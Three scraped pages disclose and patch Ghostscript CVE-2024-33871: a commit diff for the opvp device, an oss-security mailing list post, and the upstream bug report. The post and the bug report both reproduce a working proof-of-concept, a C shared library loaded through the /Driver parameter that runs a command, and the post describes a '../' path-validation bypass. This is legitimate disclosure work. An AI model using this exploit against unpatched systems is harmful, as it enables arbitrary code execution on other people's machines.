=== Content from cgit.ghostscript.com_1c96e7f1_20250110_173413.html ===


| [cgit logo](/cgi-bin/cgit.cgi/) | [index](/cgi-bin/cgit.cgi/) : [ghostpdl.git](/cgi-bin/cgit.cgi/ghostpdl.git/ "ghostpdl.git") | 7cf36fb5bd BGPrint\_fixes CCAUX-configure OpenJpeg-1.5 PDF\_gstate PJL\_pdfwrite\_config Type3\_PCL alphabits\_fix\_test alphaslay apitest bug699791 bug707828 build\_consolidation chameleon dev-robin device\_subclassing expat-2.6.4\_update filesec fill-stroke3 freetype-2.13.3\_update freetype-2.5.5 ghostpdl-9.03 ghostpdl-9.53.x-ocr-fixes ghostpdl-9.55.0-customer470 ghostpdl-9.55.0-docs ghostpdl-9.56.0\_ttf\_fix ghostpdl-9.56.1 ghostpdl-9.56.1-backport gpdl-shared-device gs-sprintf gs10.0.0 gs10.01.0 gs10.01.1 gs10.01.1\_Bug706761 gs10.01.2 gs10.02.0 gs10.02.1 gs10.03.0 gs10.03.1 gs10.04.0 gs10.04.0\_openjpeg-2.5.2 gs9.24 gs9.26 gs9.27 gs9.27-release\_tests gs9.28-temp-for-testing gs9.50 gs9.51 gs9.52.1 gs9.53.0 gs9.53.x gs9.54.0 gs9.55.0 gs9.56.0 gs9.56.0\_zlib\_1.2.12 gs904 gs905 gs906 gs907 gs908 gs910 gs912 gs914 gs915 gs916 gs917 gs918 gs919 gs920 gs921 gs922 gs923 gs925 gs925\_scanconvfixes gs\_sprintf-apache\_sprintf gs\_strtok-apache\_strtok gse-10.0.0 java-demo libpng-1.6.44\_update libs-update libtiff\_4.5.0 master mooscript nobble-cal nup-endpage opacity\_shape openjpeg-2.2.0-update openjpeg-2.5.2\_update openjpeg-update-20160927 page\_group patt\_trans\_clist pattern\_simplification pdfi pdfi\_alpha1 pdfwrite\_ocr ramfs\_branch rjw-test robin-test-base tiff-4.7.0\_update zlib-1.2.8 |
| --- | --- | --- |
| Ghostscript and GhostPDL | Tor Andersson |

| [summary](/cgi-bin/cgit.cgi/ghostpdl.git/)[refs](/cgi-bin/cgit.cgi/ghostpdl.git/refs/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)[log](/cgi-bin/cgit.cgi/ghostpdl.git/log/)[tree](/cgi-bin/cgit.cgi/ghostpdl.git/tree/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)[commit](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)[diff](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Zdenek Hutyra <zhutyra@centrum.cz> | 2024-04-22 13:33:47 +0100 |
| --- | --- | --- |
| committer | Chris Liddell <chris.liddell@artifex.com> | 2024-05-02 10:40:55 +0100 |
| commit | [7145885041bb52cc23964f0aa2aec1b1c82b5908](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908) ([patch](/cgi-bin/cgit.cgi/ghostpdl.git/patch/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)) | |
| tree | [a3a83b2fbafddad0d1e2853eb6aa7bf218b5ae2a](/cgi-bin/cgit.cgi/ghostpdl.git/tree/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908) | |
| parent | [be3fa36d2f57551a29c9e5d35f76906a50e63d4a](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=be3fa36d2f57551a29c9e5d35f76906a50e63d4a) ([diff](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908&id2=be3fa36d2f57551a29c9e5d35f76906a50e63d4a)) | |

OPVP device - prevent unsafe parameter change with SAFER[ghostpdl-10.03.1](/cgi-bin/cgit.cgi/ghostpdl.git/tag/?h=ghostpdl-10.03.1)[gs10.03.1](/cgi-bin/cgit.cgi/ghostpdl.git/log/?h=gs10.03.1)Bug #707754 "OPVP device - Arbitrary code execution via custom Driver library"
The "Driver" parameter for the "opvp"/"oprp" device specifies the name
of a dynamic library and allows any library to be loaded.
The patch does not allow changing this parameter after activating path
control.
This addresses CVE-2024-33871
[Diffstat](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)

| -rw-r--r-- | [contrib/opvp/gdevopvp.c](/cgi-bin/cgit.cgi/ghostpdl.git/diff/contrib/opvp/gdevopvp.c?id=7145885041bb52cc23964f0aa2aec1b1c82b5908) | 6 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 6 insertions, 0 deletions

| diff --git a/contrib/opvp/gdevopvp.c b/contrib/opvp/gdevopvp.cindex 74200cf9d..80eb23b17 100644--- a/[contrib/opvp/gdevopvp.c](/cgi-bin/cgit.cgi/ghostpdl.git/tree/contrib/opvp/gdevopvp.c?id=be3fa36d2f57551a29c9e5d35f76906a50e63d4a)+++ b/[contrib/opvp/gdevopvp.c](/cgi-bin/cgit.cgi/ghostpdl.git/tree/contrib/opvp/gdevopvp.c?id=7145885041bb52cc23964f0aa2aec1b1c82b5908)@@ -3456,6 +3456,12 @@ \_put\_params(gx\_device \*dev, gs\_param\_list \*plist) code = param\_read\_string(plist, pname, &vdps); switch (code) { case 0:+ if (gs\_is\_path\_control\_active(dev->memory)+ && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size+ || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {+ param\_signal\_error(plist, pname, gs\_error\_invalidaccess);+ return\_error(gs\_error\_invalidaccess);+ } buff = realloc(buff, vdps.size + 1); memcpy(buff, vdps.data, vdps.size); buff[vdps.size] = 0; |
| --- |

generated by [cgit v1.2.3](https://git.zx2c4.com/cgit/about/) ([git 2.25.1](https://git-scm.com/)) at 2025-01-10 17:34:13 +0000



=== Content from www.openwall.com_a108b606_20250110_173414.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2024/07/03/7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240628033444.GA521@openwall.com>
Date: Fri, 28 Jun 2024 05:34:45 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including CVE-2024-33871 arbitrary code execution

Hi,

Ghostscript 10.03.1 (2024-05-02) release notes:

<https://ghostscript.readthedocs.io/en/gs10.03.1/News.html>

mentions this:

> - Fixes for CVE-2024-33869, CVE-2023-52722, CVE-2024-33870,
> CVE-2024-33871 and CVE-2024-29510

> - A vulnerability was identified in the way Ghostscript/GhostPDL called
> tesseract for the OCR devices, which could allow arbitrary code
> execution. As as result, we strongly urge anyone including the OCR
> devices in their build to update as soon as possible.

Out of these, CVE-2024-33871 is probably the worst (CVSS 8.8 and
Important per Red Hat):

<https://access.redhat.com/security/cve/CVE-2024-33871>

> A flaw was found in Ghostscript. The "Driver" parameter for the
> "opvp"/"oprp" device specifies the name of a dynamic library and allows
> any library to be loaded. This flaw allows a malicious user to send a
> specially crafted document that, when processed by Ghostscript, could
> potentially lead to arbitrary code execution with the privileges of the
> Ghostscript process on the system.

(recently patched in RHEL 8 and 9, and thus in the RHEL rebuild distros)

There's a patch and a reproducer for it in upstream Bugzilla:

<https://bugs.ghostscript.com/show_bug.cgi?id=707754>

> zhutyra 2024-04-21 15:27:29 UTC
>
> Created attachment 25611 [details]
> patch

+++ a/contrib/opvp/gdevopvp.c
@@ -3456,6 +3456,12 @@ _put_params(gx_device *dev, gs_param_list *plist)
     code = param_read_string(plist, pname, &vdps);
     switch (code) {
     case 0:
+        if (gs_is_path_control_active(dev->memory)
+            && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size
+                || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {
+            param_signal_error(plist, pname, gs_error_invalidaccess);
+            return_error(gs_error_invalidaccess);
+        }
         buff = realloc(buff, vdps.size + 1);
         memcpy(buff, vdps.data, vdps.size);
         buff[vdps.size] = 0;

> The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.
>
> The patch does not allow changing this parameter after activating path control.
>
> Comment 1 zhutyra 2024-04-21 15:29:14 UTC
>
> Created attachment 25612 [details]
> exploit
>
> Exploit for x86_64 Linux.
> ```
> $ gs -q -dNODISPLAY opvplib.ps
> uid=1000(user) gid=1000(user) groups=1000(user)
> ```
>
> The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually.
> ```
> $ cat >lib.c <<"EOF"
> #include <stdlib.h>
> static void __attribute__ ((constructor)) init(void) {
>     exit(system("id"));
> }
> EOF
> $ gcc -fPIC -shared -o /tmp/lib.so lib.c
> $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice'
> uid=1000(user) gid=1000(user) groups=1000(user)

The second attachment (exploit) gives me "Sorry, you are not authorized
to access attachment #25612." but apparently it's just a precompiled
version of what's included in the comment body, above, so not required
to exploit the issue.  A colleague has tested the above exploit on
latest CentOS 7 and it just worked (now patched in CIQ's CentOS Bridge).

CVE-2024-33870 is also pretty bad:

<https://access.redhat.com/security/cve/CVE-2024-33870>

> A flaw was found in Ghostscript. When the gp_validate_path_len function
> validates a path, it distinguishes between absolute and relative paths.
> In the case of relative paths, it will check the path with and without
> the current-directory-prefix ("foo" and "./foo"). This does not take
> into account paths with a parent-directory-prefix. Therefore, a path
> like "../../foo" is also tested as "./../../foo" and if the current
> directory "./" is in the permitted paths, it will pass the check, which
> may allow arbitrary file access.

The remaining 3 CVEs are also serious, although they have lower scores.

The CVE records for all four 2024 CVEs above still merely say "reserved
by a CNA", without descriptions.  The 2023 CVE has proper info in it.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.ghostscript.com_ff559bba_20250110_173413.html ===


Bugzilla – Bug 707754
OPVP device - Arbitrary code execution via custom Driver library
Last modified: 2024-05-24 13:26:11 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=707754&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=707754&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 707754**](show_bug.cgi?id=707754)
- OPVP device - Arbitrary code execution via custom Driver library

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
OPVP device - Arbitrary code execution via custom Driver library

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Ghostscript | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Ghostscript "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Security (public) ([show other bugs](buglist.cgi?component=Security%20(public)&product=Ghostscript&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P2 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Chris Liddell (chrisl) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2024-04-21 15:27 UTC by zhutyra | | --- | --- | | Modified: | 2024-05-24 13:26 UTC ([History](show_activity.cgi?id=707754)) | | CC List: | 11 users (show)  akhaitov carnil cbuissar dr jsmeix ken.sharp marc.deslauriers rlescak robin.watts sam till.kamppeter | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Customer:](page.cgi?id=fields.html#cf_customer "A custom Free Text field in this installation of Bugzilla.") |  | | [Word Size:](page.cgi?id=fields.html#cf_wordsize "For example x86 would be 32 and x86_64 would be 64.") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**patch**](attachment.cgi?id=25611 "View the content of the attachment") (803 bytes, patch)  [2024-04-21 15:27 UTC](#attach_25611 "Go to the comment associated with the attachment"), zhutyra | [Details](attachment.cgi?id=25611&action=edit) | [Diff](attachment.cgi?id=25611&action=diff) | | [Add an attachment](attachment.cgi?bugid=707754&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=707754&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=707754#c0)  zhutyra    2024-04-21 15:27:29 UTC  ``` Created [attachment 25611](attachment.cgi?id=25611&action=diff "patch") [[details]](attachment.cgi?id=25611&action=edit "patch") patch  The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.  The patch does not allow changing this parameter after activating path control. ```  [Comment 1](show_bug.cgi?id=707754#c1)  zhutyra    2024-04-21 15:29:14 UTC  ``` Created [attachment 25612](attachment.cgi?id=25612) [[details]](attachment.cgi?id=25612&action=edit) exploit  Exploit for x86_64 Linux. ``` $ gs -q -dNODISPLAY opvplib.ps uid=1000(user) gid=1000(user) groups=1000(user) ```  The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually. ``` $ cat >lib.c <<"EOF" #include <stdlib.h> static void __attribute__ ((constructor)) init(void) {     exit(system("id")); } EOF $ gcc -fPIC -shared -o /tmp/lib.so lib.c $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice' uid=1000(user) gid=1000(user) groups=1000(user) ``` ```  [Comment 2](show_bug.cgi?id=707754#c2)  Ken Sharp    2024-04-22 12:42:34 UTC  ``` I've used the commit as supplied, thanks for that!  We're just about to start the process of a patch release, I'll amend the status when the patch is available which will be in a week or two, unless something else comes up.  I'm anticipating this might take us longer than usual because we will probably be applying for a CVE for this and other recent patches. It's become obvious that some distros have long term support versions of Ghostscript and they only apply patches with CVEs to those codebases. So we're more or less forced to get CVEs for any serious issues in order to ensure those versions get patched.  We're keeping all the security patches private until the release, because we know someone has been mining our repository for security related patches and exploiting them. So I'm afraid that I can't point you to a commit in the repository for review :-( ```  [Comment 3](show_bug.cgi?id=707754#c3)  Chris Liddell (chrisl)    2024-04-29 12:40:01 UTC  ``` CVE-2024-33871 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=707754)
* - [XML](show_bug.cgi?ctype=xml&id=707754)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=707754)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=707754&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=707754&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


